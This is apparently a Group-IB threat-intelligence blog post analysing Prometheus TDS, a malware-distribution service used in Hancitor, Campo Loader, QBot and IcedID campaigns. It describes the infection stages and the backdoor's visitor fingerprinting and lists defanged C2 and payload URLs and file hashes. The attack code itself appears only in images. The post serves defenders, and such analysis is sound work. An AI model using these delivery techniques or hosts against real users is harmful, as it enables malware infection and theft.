<form class="search-form" role="search" method="get" id="" action="https://www.group-ib.com/">
  <input type="search" placeholder="Search" name="s" id="search-input" value=""/>
  <button type="submit" class="search-button"><img src="/wp-content/themes/gib-theme/assets/images/search-icon.svg" alt="Search Icon"></button>
</form>   </div>
</div>

<style>
  .hidden {
    display: none;
  }
</style>

<script type="text/rocketlazyloadscript">
  const openSearchPopupBtns = [...document.querySelectorAll('.open-search-popup')];
  const closeSearchPopupBtns = [...document.querySelectorAll('.close-search-popup')];
  const searchPopup = document.querySelector('.search-popup');

  const closePopup = () => {
    searchPopup.style.display = 'none';
    openSearchPopupBtns.forEach(btn => btn.classList.remove('hidden'));
    closeSearchPopupBtns.forEach(btn => btn.classList.add('hidden'));
  };

  openSearchPopupBtns.forEach(openSearchPopupBtn => {
    openSearchPopupBtn.addEventListener('click', (e) => {
      e.preventDefault();

      searchPopup.style.display = 'block';
      openSearchPopupBtn.classList.add('hidden');
      closeSearchPopupBtns.forEach(btn => btn.classList.remove('hidden'));
    });
  });

  closeSearchPopupBtns.forEach(closeSearchPopupBtn => {
    closeSearchPopupBtn.addEventListener('click', () => {
      closePopup();
    });
  });

  document.addEventListener('click', (event) => {
    if (!searchPopup.contains(event.target) && !openSearchPopupBtns.some(btn => btn.contains(event.target)) && !closeSearchPopupBtns.some(btn => btn.contains(event.target))) {
      setTimeout(() => {
        if (!searchPopup.contains(event.target)) {
          closePopup();
        }
      }, 100);
    }
  });
</script>    </div>

                            <h1 class="header__title title-h2 mb-24 mt-md-48 mt-lg-64 mt-xl-64">Prometheus TDS</h1><p class="header__text mb-xs-48 mb-64 mb-lg-96 mb-xl-96">The key to success for Campo Loader, Hancitor, IcedID, and QBot</p><div class="post-info__date mb-24 mb-lg-32 mb-xl-48"><div class="body2">August 5, 2021 · <span id="reading-time"></span> min to read · Threat Intelligence</div></div><div class="post-info__image mb-24 mb-lg-32 mb-xl-48"><picture><source srcset="https://www.group-ib.com/wp-content/uploads/prometheus-tds-1.png.webp" type="image/webp"><img data-no-lazy="" fetchpriority="high" src="https://www.group-ib.com/wp-content/uploads/prometheus-tds-1.png" alt="" class="webpexpress-processed"></picture></div><div class="post-info__tags"><div class="post-info__tag body2">Hancitor</div><div class="post-info__tag body2">Prometheus TDS</div><div class="post-info__tag body2">Threat Intelligence</div></div>                        </div>
                    </div>
                </div>
                <div class="blog-post-content" id="blog-post-content">
                    <div class="blog-post-content__section--text"><h2>Introduction</h2>
<p>In the spring of 2021, Group-IB&#8217;s <a href="/products/threat-intelligence/" target="_blank" rel="noopener">Threat Intelligence</a> analysts discovered traces of a malware campaign distributing Hancitor. The researchers took an interest in an untypical pattern of the downloader&#8217;s distribution, which was subsequently described by <a href="https://unit42.paloaltonetworks.com/hancitor-infections-cobalt-strike/" target="_blank" rel="nofollow noopener">Unit 42</a> and <a href="https://www.mcafee.com/blogs/other-blogs/mcafee-labs/hancitor-making-use-of-cookies-to-prevent-url-scraping/?web_view=true" target="_blank" rel="nofollow noopener">McAfee</a> researchers as a new technique designed to hide documents containing malicious links from web scanners&#8217; radars. However, the data extracted by Group-IB&#8217;s analysts indicates that a similar pattern is also used to distribute malware such as Campo Loader, IcedID, QBot, SocGholish, and Buer Loader.</p>
<p><strong>Group-IB discovered at least 3,000 targets of separate malware campaigns that make use of the same scheme.</strong> By analyzing the list of targets, the experts were able to establish the two most active campaigns. The first targeted individuals in Belgium, and the second targeted companies, corporations, universities, and government organizations in the United States.</p>
<p>By analyzing the malware distribution campaigns, Group-IB&#8217;s experts were able to conclude that it was possible for them to be carried out using the same MaaS solution. This assumption was later confirmed by Group-IB&#8217;s analysts after they found a sale notice for a service designed to distribute malicious files and redirect users to phishing and malicious sites — Prometheus TDS (Traffic Direction System) — on one of the underground platforms.</p>
<h2>Description</h2>
<p><strong>Prometheus TDS is an underground service that distributes malicious files and redirects visitors to phishing and malicious sites.</strong> This service is made up of the Prometheus TDS administrative panel, in which an attacker configures the necessary parameters for a malicious campaign: downloading malicious files, and configuring restrictions on users&#8217; geolocation, browser version, and operating system.</p>
<p>To prevent victims of malicious campaigns from interacting with the administrative panel directly, which may result in the attacker&#8217;s server being disclosed and blocked, <strong>Prometheus TDS uses third-party infected websites that act as a middleman between the attacker&#8217;s administrative panel and the user</strong>. It should also be mentioned that the list of compromised websites is manually added by the malware campaign&#8217;s operators. The list is uploaded through importing links to <a href="https://www.group-ib.com/resources/knowledge-hub/web-shell/" target="_blank" rel="noopener">web shells</a>. A special PHP file named Prometheus.Backdoor is uploaded to the compromised websites to collect and send back data about the user interacting with the administrative panel. After analyzing the data collected, the administrative panel decides whether to send the payload to the user and/or to redirect them to the specified URL.</p>
<p><strong>More than three thousand email addresses targeted in the first phase of malicious campaigns</strong> in which Prometheus TDS was used to send malicious emails were extracted by Group-IB Threat Intelligence analysts. The extracted data analysis helped identify the most active campaigns, one targeting individuals in Belgium (more than 2,000 emails) and the other targeting US government agencies, companies, and corporations in various sectors (banking and finance, retail, energy and mining, cybersecurity, healthcare, IT, and insurance), (more than 260 emails). The data about identified targets of attacks with the use of Prometheus TDS and companies affected as their result has been handed over to the US, German and Belgian CERTs.</p>
<div id="attachment_25606" style="width: 1510px" class="wp-caption alignnone"><img aria-describedby="caption-attachment-25606" decoding="async" class="size-full wp-image-25606" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201500%20843'%3E%3C/svg%3E" alt="Targets of malicious campaigns with the use of Prometheus TDS" width="1500" height="843" data-lazy-src="https://www.group-ib.com/wp-content/uploads/1-min-6.webp" /><noscript><img aria-describedby="caption-attachment-25606" decoding="async" class="size-full wp-image-25606" src="https://www.group-ib.com/wp-content/uploads/1-min-6.webp" alt="Targets of malicious campaigns with the use of Prometheus TDS" width="1500" height="843" /></noscript><p id="caption-attachment-25606" class="wp-caption-text">Targets of malicious campaigns with the use of Prometheus TDS</p></div>
<h2>Attack scheme using Prometheus TDS</h2>
<p>The distribution of malware using Prometheus TDS is carried out in several stages.</p>
<h3>Stage 1</h3>
<p>The user receives an email containing one of the following elements:</p>
<ul>
<li>An HTML file that redirects the user to a compromised site on which Prometheus.Backdoor is installed;</li>
<li>A link to a web shell that redirects users to a specified URL, in this case to one of the addresses used by Prometheus TDS;</li>
<li>A link to a Google Doc containing the URL redirecting users to a malicious link.</li>
</ul>
<div id="attachment_25607" style="width: 1510px" class="wp-caption alignnone"><img aria-describedby="caption-attachment-25607" decoding="async" class="size-full wp-image-25607" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201500%20843'%3E%3C/svg%3E" alt="The implementation of malicious campaigns with the use of Prometheus TDS" width="1500" height="843" data-lazy-src="https://www.group-ib.com/wp-content/uploads/2-min-4.webp" /><noscript><img aria-describedby="caption-attachment-25607" decoding="async" class="size-full wp-image-25607" src="https://www.group-ib.com/wp-content/uploads/2-min-4.webp" alt="The implementation of malicious campaigns with the use of Prometheus TDS" width="1500" height="843" /></noscript><p id="caption-attachment-25607" class="wp-caption-text">The implementation of malicious campaigns with the use of Prometheus TDS</p></div>
<div id="attachment_25608" style="width: 1690px" class="wp-caption alignnone"><img aria-describedby="caption-attachment-25608" decoding="async" class="size-full wp-image-25608" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201680%20839'%3E%3C/svg%3E" alt="Google Docs files used by Prometheus TDS" width="1680" height="839" data-lazy-src="https://www.group-ib.com/wp-content/uploads/3-min-3.webp" /><noscript><img aria-describedby="caption-attachment-25608" decoding="async" class="size-full wp-image-25608" src="https://www.group-ib.com/wp-content/uploads/3-min-3.webp" alt="Google Docs files used by Prometheus TDS" width="1680" height="839" /></noscript><p id="caption-attachment-25608" class="wp-caption-text">Google Docs files used by Prometheus TDS</p></div>
<h3>Stage 2</h3>
<p>The user opens the attachment or follows the link and is redirected to the Prometheus.Backdoor URL. Prometheus.Backdoor collects the available data on the user.</p>
<h3>Stage 3</h3>
<p>The data collected is sent to the Prometheus TDS admin panel. This admin panel then decides whether to instruct the backdoor to send a malicious file to the users and/or to redirect them to the specified URL.</p>
<h2>Analysis of Prometheus.Backdoor</h2>
<p>Malicious campaigns using Prometheus TDS are carried out via hacked sites with <strong>Prometheus.Backdoor</strong> installed on them. The backdoor is controlled through the admin panel.</p>
<div id="attachment_25609" style="width: 1376px" class="wp-caption alignnone"><img aria-describedby="caption-attachment-25609" decoding="async" class="size-full wp-image-25609" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201366%20768'%3E%3C/svg%3E" alt="Prometheus TDS admin panel" width="1366" height="768" data-lazy-src="https://www.group-ib.com/wp-content/uploads/4-min-2.webp" /><noscript><img aria-describedby="caption-attachment-25609" decoding="async" class="size-full wp-image-25609" src="https://www.group-ib.com/wp-content/uploads/4-min-2.webp" alt="Prometheus TDS admin panel" width="1366" height="768" /></noscript><p id="caption-attachment-25609" class="wp-caption-text">Prometheus TDS admin panel</p></div>
<p>The data exchange between the administrative panel and the backdoor is encrypted with an XOR cipher. The key for this cipher is explicitly hardcoded in the Prometheus.Backdoor settings, along with the address of the administrative panel used by the attackers to manage backdoors on infected sites.</p>
<div id="attachment_25610" style="width: 495px" class="wp-caption alignnone"><picture><source data-lazy-srcset="https://www.group-ib.com/wp-content/uploads/5-min-16.png.webp" type="image/webp"><img aria-describedby="caption-attachment-25610" decoding="async" class="wp-image-25610 size-full webpexpress-processed" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20485%20545'%3E%3C/svg%3E" alt="A fragment of the Prometheus.Backdoor code " width="485" height="545" data-lazy-src="https://www.group-ib.com/wp-content/uploads/5-min-16.png"><noscript><img aria-describedby="caption-attachment-25610" decoding="async" class="wp-image-25610 size-full webpexpress-processed" src="https://www.group-ib.com/wp-content/uploads/5-min-16.png" alt="A fragment of the Prometheus.Backdoor code " width="485" height="545"></noscript></picture><p id="caption-attachment-25610" class="wp-caption-text">A fragment of the Prometheus.Backdoor code containing the address of the administrative panel, a key for encrypting transmitted data, and functions for encrypting and decrypting data</p></div>
<p>After the user visits the infected site, Prometheus.Backdoor collects basic information about them: IP address, User-Agent, Referrer header, time zone, and language data, and then forwards this information to the Prometheus admin panel.</p>
<div id="attachment_25611" style="width: 791px" class="wp-caption alignnone"><picture><source data-lazy-srcset="https://www.group-ib.com/wp-content/uploads/6-min-13.png.webp" type="image/webp"><img aria-describedby="caption-attachment-25611" decoding="async" class="size-full wp-image-25611 webpexpress-processed" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20781%20698'%3E%3C/svg%3E" alt="Part of the Prometheus.Backdoor code used to collect information about the user" width="781" height="698" data-lazy-src="https://www.group-ib.com/wp-content/uploads/6-min-13.png"><noscript><img aria-describedby="caption-attachment-25611" decoding="async" class="size-full wp-image-25611 webpexpress-processed" src="https://www.group-ib.com/wp-content/uploads/6-min-13.png" alt="Part of the Prometheus.Backdoor code used to collect information about the user" width="781" height="698"></noscript></picture><p id="caption-attachment-25611" class="wp-caption-text">Part of the Prometheus.Backdoor code used to collect information about the user&#8217;s time zone</p></div>
<div id="attachment_25612" style="width: 453px" class="wp-caption alignnone"><picture><source data-lazy-srcset="https://www.group-ib.com/wp-content/uploads/7-min-13.png.webp" type="image/webp"><img aria-describedby="caption-attachment-25612" decoding="async" class="size-full wp-image-25612 webpexpress-processed" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20443%20381'%3E%3C/svg%3E" alt="Part of the Prometheus.Backdoor code showing the algorithm used to generate a request " width="443" height="381" data-lazy-src="https://www.group-ib.com/wp-content/uploads/7-min-13.png"><noscript><img aria-describedby="caption-attachment-25612" decoding="async" class="size-full wp-image-25612 webpexpress-processed" src="https://www.group-ib.com/wp-content/uploads/7-min-13.png" alt="Part of the Prometheus.Backdoor code showing the algorithm used to generate a request " width="443" height="381"></noscript></picture><p id="caption-attachment-25612" class="wp-caption-text">Part of the Prometheus.Backdoor code showing the algorithm used to generate a request to the administrative panel for the transfer of visitor data</p></div>
<p><strong>If the user is not recognized as a bot, then, depending on the configuration, the administrative panel can send a command to redirect the user to the specified URL, or to send a malicious file.</strong> The payload file is sent using a special JavaScript code. Most often, the malicious software can be found in weaponized Microsoft Word or Excel documents, however, the attackers also use ZIP and RAR files. In some cases, the user will be redirected to a legitimate site immediately after downloading the file, so it will appear to them like the file was downloaded from a safe source.</p>
<div id="attachment_25613" style="width: 683px" class="wp-caption alignnone"><picture><source data-lazy-srcset="https://www.group-ib.com/wp-content/uploads/8-min-13.png.webp" type="image/webp"><img aria-describedby="caption-attachment-25613" decoding="async" class="size-full wp-image-25613 webpexpress-processed" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20673%20776'%3E%3C/svg%3E" alt="Part of the Prometheus.Backdoor code showing a method for serving malicious files" width="673" height="776" data-lazy-src="https://www.group-ib.com/wp-content/uploads/8-min-13.png"><noscript><img aria-describedby="caption-attachment-25613" decoding="async" class="size-full wp-image-25613 webpexpress-processed" src="https://www.group-ib.com/wp-content/uploads/8-min-13.png" alt="Part of the Prometheus.Backdoor code showing a method for serving malicious files" width="673" height="776"></noscript></picture><p id="caption-attachment-25613" class="wp-caption-text">Part of the Prometheus.Backdoor code showing a method for serving malicious files</p></div>
<h2>Malware campaigns analysis</h2>
<h3>Campo Loader</h3>
<p>Analyzing the extracted files, Group-IB <a href="/products/threat-intelligence/" target="_blank" rel="noopener">Threat Intelligence</a> analysts found<strong> 18 unique malicious documents relating to the Campo Loader, aka the BazaLoader malware</strong>. After downloading the malware, the user is redirected to the DocuSign or USPS sites as a distraction from the malware&#8217;s activity.</p>
<div id="attachment_25614" style="width: 847px" class="wp-caption alignnone"><img aria-describedby="caption-attachment-25614" decoding="async" class="size-full wp-image-25614" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20837%20554'%3E%3C/svg%3E" alt="A screenshot of a decoy document from the &quot;Campo Loader&quot;" width="837" height="554" data-lazy-src="https://www.group-ib.com/wp-content/uploads/9-min-4.webp" /><noscript><img aria-describedby="caption-attachment-25614" decoding="async" class="size-full wp-image-25614" src="https://www.group-ib.com/wp-content/uploads/9-min-4.webp" alt="A screenshot of a decoy document from the &quot;Campo Loader&quot;" width="837" height="554" /></noscript><p id="caption-attachment-25614" class="wp-caption-text">A screenshot of a decoy document from the &#8220;Campo Loader&#8221; distribution campaign</p></div>
<p><strong>Campo Loader spreads through malicious macros in Microsoft Office documents</strong>. After the victim activates the macros, the loader saves and then decodes the .dll file, which is executed through certutil. After the dumped .dll file is executed, it sends an HTTP request to its C&amp;C server:</p>
<div id="attachment_25615" style="width: 731px" class="wp-caption alignnone"><picture><source data-lazy-srcset="https://www.group-ib.com/wp-content/uploads/10-min-12.png.webp" type="image/webp"><img aria-describedby="caption-attachment-25615" decoding="async" class="size-full wp-image-25615 webpexpress-processed" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20721%2092'%3E%3C/svg%3E" alt="Content of the malicious macros" width="721" height="92" data-lazy-src="https://www.group-ib.com/wp-content/uploads/10-min-12.png"><noscript><img aria-describedby="caption-attachment-25615" decoding="async" class="size-full wp-image-25615 webpexpress-processed" src="https://www.group-ib.com/wp-content/uploads/10-min-12.png" alt="Content of the malicious macros" width="721" height="92"></noscript></picture><p id="caption-attachment-25615" class="wp-caption-text">Content of the malicious macros</p></div>
<p>The server processes the incoming request and, depending on the victim&#8217;s geolocation (based on their IP address) decides whether to send the payload or redirect them to Yahoo!, GNU, or other resources. The downloader takes its name from the path of the same name in HTTP requests used to download malicious files during the second stage.</p>
<div id="attachment_25616" style="width: 1083px" class="wp-caption alignnone"><img aria-describedby="caption-attachment-25616" decoding="async" class="size-full wp-image-25616" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201073%20249'%3E%3C/svg%3E" alt="Redirection to gnu.org" width="1073" height="249" data-lazy-src="https://www.group-ib.com/wp-content/uploads/11-min-1.webp" /><noscript><img aria-describedby="caption-attachment-25616" decoding="async" class="size-full wp-image-25616" src="https://www.group-ib.com/wp-content/uploads/11-min-1.webp" alt="Redirection to gnu.org" width="1073" height="249" /></noscript><p id="caption-attachment-25616" class="wp-caption-text">Redirection to gnu.org</p></div>
<p>If the administrative panel gives the command to send the payload, then the user is redirected to the resource where it is stored or receives it directly from the C&amp;C server.</p>
<div id="attachment_25617" style="width: 1008px" class="wp-caption alignnone"><img aria-describedby="caption-attachment-25617" decoding="async" class="size-full wp-image-25617" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20998%20536'%3E%3C/svg%3E" alt="Results of the request satisfying the server's requirements" width="998" height="536" data-lazy-src="https://www.group-ib.com/wp-content/uploads/12-min.webp" /><noscript><img aria-describedby="caption-attachment-25617" decoding="async" class="size-full wp-image-25617" src="https://www.group-ib.com/wp-content/uploads/12-min.webp" alt="Results of the request satisfying the server's requirements" width="998" height="536" /></noscript><p id="caption-attachment-25617" class="wp-caption-text">Results of the request satisfying the server&#8217;s requirements to upload a second stage file</p></div>
<p>Analysis revealed that Campo Loader was used at various times to distribute TrickBot and Ursnif/Gozi bankers, etc.</p>
<div id="attachment_25618" style="width: 1376px" class="wp-caption alignnone"><img aria-describedby="caption-attachment-25618" decoding="async" class="size-full wp-image-25618" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201366%20768'%3E%3C/svg%3E" alt="Campo Loader administrative panel" width="1366" height="768" data-lazy-src="https://www.group-ib.com/wp-content/uploads/13-min-1.webp" /><noscript><img aria-describedby="caption-attachment-25618" decoding="async" class="size-full wp-image-25618" src="https://www.group-ib.com/wp-content/uploads/13-min-1.webp" alt="Campo Loader administrative panel" width="1366" height="768" /></noscript><p id="caption-attachment-25618" class="wp-caption-text">Campo Loader administrative panel</p></div>
<h3>Hancitor</h3>
<p>Monitoring of Prometheus TDS revealed 34 malicious documents relating to the Hancitor malware, which is a downloader trojan.</p>
<div id="attachment_25619" style="width: 1286px" class="wp-caption alignnone"><picture><source data-lazy-srcset="https://www.group-ib.com/wp-content/uploads/14-min-9.png.webp" type="image/webp"><img aria-describedby="caption-attachment-25619" decoding="async" class="size-full wp-image-25619 webpexpress-processed" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201276%20798'%3E%3C/svg%3E" alt="A screenshot of a decoy document from the Hancitor" width="1276" height="798" data-lazy-src="https://www.group-ib.com/wp-content/uploads/14-min-9.png"><noscript><img aria-describedby="caption-attachment-25619" decoding="async" class="size-full wp-image-25619 webpexpress-processed" src="https://www.group-ib.com/wp-content/uploads/14-min-9.png" alt="A screenshot of a decoy document from the Hancitor" width="1276" height="798"></noscript></picture><p id="caption-attachment-25619" class="wp-caption-text">A screenshot of a decoy document from the Hancitor distribution campaign</p></div>
<p>After downloading the malicious document, the victim is either redirected to the DocuSign website, or to phishing sites using IDN domains that imitate the sites of two US banks.</p>
<div id="attachment_25620" style="width: 644px" class="wp-caption alignnone"><picture><source data-lazy-srcset="https://www.group-ib.com/wp-content/uploads/15-min.jpg.webp" type="image/webp"><img aria-describedby="caption-attachment-25620" decoding="async" class="size-full wp-image-25620 webpexpress-processed" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20634%20626'%3E%3C/svg%3E" alt="A phishing page to which a user was redirected after downloading a malicious Hancitor load " width="634" height="626" data-lazy-src="https://www.group-ib.com/wp-content/uploads/15-min.jpg"><noscript><img aria-describedby="caption-attachment-25620" decoding="async" class="size-full wp-image-25620 webpexpress-processed" src="https://www.group-ib.com/wp-content/uploads/15-min.jpg" alt="A phishing page to which a user was redirected after downloading a malicious Hancitor load " width="634" height="626"></noscript></picture><p id="caption-attachment-25620" class="wp-caption-text">A phishing page to which a user was redirected after downloading a malicious Hancitor load located on an IDN domain xn--keynvigatorkey-yp8g[.]com (https://urlscan.io/result/108463b8-7c0d-4644-9d2b-52cbca3426f8/)</p></div>
<p>One of the files identified (<em>SHA1: 41138f0331c3edb731c9871709cffd01e4ba2d88</em>) was sent in a phishing email containing a link to a Google Doc. The document stored in Google Docs contained the link <em>hXXps://webworks.nepila[.]com/readies.php</em>. When the victim clicks on the link, a request is sent to Prometheus.Backdoor. The server then processes the data collected about the user&#8217;s system and decides whether to send the payload or not.</p>
<div id="attachment_25621" style="width: 1289px" class="wp-caption alignnone"><img aria-describedby="caption-attachment-25621" decoding="async" class="size-full wp-image-25621" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201279%20722'%3E%3C/svg%3E" alt="An example of requests to a site containing Prometheus.Backdoor" width="1279" height="722" data-lazy-src="https://www.group-ib.com/wp-content/uploads/16-min.webp" /><noscript><img aria-describedby="caption-attachment-25621" decoding="async" class="size-full wp-image-25621" src="https://www.group-ib.com/wp-content/uploads/16-min.webp" alt="An example of requests to a site containing Prometheus.Backdoor" width="1279" height="722" /></noscript><p id="caption-attachment-25621" class="wp-caption-text">An example of requests to a site containing Prometheus.Backdoor, with successful delivery of a malicious document and subsequent redirection to DocuSign</p></div>
<p>The screenshot above shows that the response to the first request for the file &#8220;<em>readies.php</em>&#8221; is 937 bits, while the second one is 424,594 bits. This means that the server approved the victim&#8217;s device settings and the second request resulted in the download of the Base64 file &#8220;<em>0301_343810790.doc</em>&#8220;. After downloading the file, the victim is redirected to Docusign.com.</p>
<div id="attachment_25622" style="width: 507px" class="wp-caption alignnone"><img aria-describedby="caption-attachment-25622" decoding="async" class="size-full wp-image-25622" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20497%20517'%3E%3C/svg%3E" alt="Part of the Prometheus.Backdoor code " width="497" height="517" data-lazy-src="https://www.group-ib.com/wp-content/uploads/17-min.webp" /><noscript><img aria-describedby="caption-attachment-25622" decoding="async" class="size-full wp-image-25622" src="https://www.group-ib.com/wp-content/uploads/17-min.webp" alt="Part of the Prometheus.Backdoor code " width="497" height="517" /></noscript><p id="caption-attachment-25622" class="wp-caption-text">Part of the Prometheus.Backdoor code showing a malicious file distribution pattern</p></div>
<p>The saved file &#8220;<em>0301_343810790.doc</em>&#8221; is a .doc file containing malicious macros. After activating the macros in the document, the DLL file is dropped and executed by path <em>c:\users\%username%\appdata\local\temp\Static.dll</em>, using <em>rundll32.exe</em>. After the file has been executed, the following HTTP requests are sent:</p>
<ul>
<li>hxxp://api.ipify[.]org/</li>
<li>hxxp://ementincied[.]com/8/forum.php</li>
<li>hxxp://mymooney[.]ru/6fwedzs3w3fg.exe</li>
</ul>
<div id="attachment_25623" style="width: 1369px" class="wp-caption alignnone"><picture><source data-lazy-srcset="https://www.group-ib.com/wp-content/uploads/18-min-5.png.webp" type="image/webp"><img aria-describedby="caption-attachment-25623" decoding="async" class="size-full wp-image-25623 webpexpress-processed" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201359%20477'%3E%3C/svg%3E" alt="The downloaded file "6fwedzs3w3fg.exe" " width="1359" height="477" data-lazy-src="https://www.group-ib.com/wp-content/uploads/18-min-5.png"><noscript><img aria-describedby="caption-attachment-25623" decoding="async" class="size-full wp-image-25623 webpexpress-processed" src="https://www.group-ib.com/wp-content/uploads/18-min-5.png" alt="The downloaded file "6fwedzs3w3fg.exe" " width="1359" height="477"></noscript></picture><p id="caption-attachment-25623" class="wp-caption-text">The downloaded file &#8220;6fwedzs3w3fg.exe&#8221; (SHA1: 7394632d8cfc00c35570d219e49de63076294b6b ) is a sample of Ficker Stealer</p></div>
<p>In April 2021, Unit 42 researchers partially analyzed this campaign. The experts also mention the Ficker Stealer, Cobalt Strike, and Send-Safe spambots in their <a href="https://unit42.paloaltonetworks.com/hancitor-infections-cobalt-strike/" target="_blank" rel="nofollow noopener">research</a>.</p>
<h3>QBot</h3>
<p>The following documents were found among the files used to distribute <strong>the banking trojan QBot</strong>.</p>
</div>
                            
                            <div class="blog-post-content__section"><div class="table"><div class="table__wrapper"><table width="100%" data-table-width="25%;20%;15%;15%;25%">
<thead>
<tr>
<th width="25%">Filename</th>
<th width="20%">SHA1</th>
</tr>
</thead>
<tbody>
<tr>
<td width="25%">document-12603942.xls</td>
<td width="20%">2d74e52ac0e3ebbf2bb4aabb6469cba9badd70eb</td>
</tr>
<tr>
<td width="25%">document-348056604.xls</td>
<td width="20%">db23b35b2c2b8bf413fb57ee9017127f651e0304</td>
</tr>
</tbody>
</table>
</div></div></div><div class="blog-post-content__section--text"><p>These documents are lure files that require macro activation when launched. As soon as the macros are activated, an HTTP request is sent to download the DLL file with the payload.</p>
<div id="attachment_25624" style="width: 803px" class="wp-caption alignnone"><picture><source data-lazy-srcset="https://www.group-ib.com/wp-content/uploads/19-min-5.png.webp" type="image/webp"><img aria-describedby="caption-attachment-25624" decoding="async" class="size-full wp-image-25624 webpexpress-processed" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20793%20457'%3E%3C/svg%3E" alt="Decoy document from the QBot distribution campaign" width="793" height="457" data-lazy-src="https://www.group-ib.com/wp-content/uploads/19-min-5.png"><noscript><img aria-describedby="caption-attachment-25624" decoding="async" class="size-full wp-image-25624 webpexpress-processed" src="https://www.group-ib.com/wp-content/uploads/19-min-5.png" alt="Decoy document from the QBot distribution campaign" width="793" height="457"></noscript></picture><p id="caption-attachment-25624" class="wp-caption-text">Decoy document from the QBot distribution campaign</p></div>
<p>The malicious document discovered was sending requests to the following URL addresses:</p>
<ul>
<li>https://inpulsion[.]net/ds/0702.gif</li>
<li>https://aramiglobal[.]com/ds/0502.gif</li>
</ul>
</div>
                            
                            <div class="blog-post-content__section"><div class="gallery swiper gallery-swiper-651"><div class="swiper-wrapper"><div class="swiper-slide gallery__item wp-caption"><picture><source data-lazy-srcset="https://www.group-ib.com/wp-content/uploads/20-min-4.png.webp" type="image/webp"><img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" alt="The content of malicious macros" title="20-min" class="webpexpress-processed" data-lazy-src="https://www.group-ib.com/wp-content/uploads/20-min-4.png"><noscript><img src="https://www.group-ib.com/wp-content/uploads/20-min-4.png" alt="The content of malicious macros" title="20-min" class="webpexpress-processed"></noscript></picture><p class="small wp-caption-text">The content of malicious macros</p></div><div class="swiper-slide gallery__item wp-caption"><picture><source data-lazy-srcset="https://www.group-ib.com/wp-content/uploads/21-min-4.png.webp" type="image/webp"><img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" alt="The content of malicious macros" title="21-min" class="webpexpress-processed" data-lazy-src="https://www.group-ib.com/wp-content/uploads/21-min-4.png"><noscript><img src="https://www.group-ib.com/wp-content/uploads/21-min-4.png" alt="The content of malicious macros" title="21-min" class="webpexpress-processed"></noscript></picture><p class="small wp-caption-text">The content of malicious macros</p></div></div><div class="swiper-pagination"></div><div class="swiper-button-next"></div><div class="swiper-button-prev"></div></div></div>

<h3>IcedID</h3>
<p>One of the malicious documents sent using Prometheus TDS distributed <strong>the banking Trojan IcedID, aka Bokbot.</strong></p>
<div id="attachment_25627" style="width: 1281px" class="wp-caption alignnone"><picture><source data-lazy-srcset="https://www.group-ib.com/wp-content/uploads/22-min-4.png.webp" type="image/webp"><img aria-describedby="caption-attachment-25627" decoding="async" class="size-full wp-image-25627 webpexpress-processed" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201271%20617'%3E%3C/svg%3E" alt="A screenshot of a decoy document from the IcedID malware" width="1271" height="617" data-lazy-src="https://www.group-ib.com/wp-content/uploads/22-min-4.png"><noscript><img aria-describedby="caption-attachment-25627" decoding="async" class="size-full wp-image-25627 webpexpress-processed" src="https://www.group-ib.com/wp-content/uploads/22-min-4.png" alt="A screenshot of a decoy document from the IcedID malware" width="1271" height="617"></noscript></picture><p id="caption-attachment-25627" class="wp-caption-text">A screenshot of a decoy document from the IcedID malware distribution campaign</p></div>
<p>After opening the document and running the macros, the office file attempted to download and run the DLL file at <em>hXXp://denazao[.]info/images/1j.djvu</em>. The file was not available at the time of analysis. A similar office document was found on <a href="https://www.virustotal.com/gui/file/ae93a0e0085bcae5ec9f21cb71df0b7d3a6682fa5c8ac4e763f70884cb7bf5c6/details" target="_blank" rel="nofollow noopener">VirusTotal</a>; it also downloaded the payload from <em>hXXp://denazao[.]info/images/1j.djvu</em>. After launching the payload, the request was sent to the IcedID C&amp;C server located at <em>hXXp://twotimercvac[.]uno/</em>.</p>
